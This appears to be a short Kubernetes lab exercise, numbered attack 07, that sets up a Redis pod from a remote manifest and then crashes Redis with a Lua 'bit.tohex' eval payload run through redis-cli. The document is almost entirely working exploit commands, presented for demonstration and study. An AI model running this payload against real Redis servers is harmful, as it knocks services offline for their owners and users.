# Setup

```bash
kubectl apply -f https://k8s.adriansoftware.de/attacks/07/setup.yaml
```

# Attack

```bash
ID=$(kubectl get pods -o wide | grep redis | awk '{print $1}')
kubectl exec -it $ID -- /bin/bash
redis-cli
### in redis-cli
eval "return bit.tohex(65535, -2147483648)" 0
```

Redis crashes with error 137.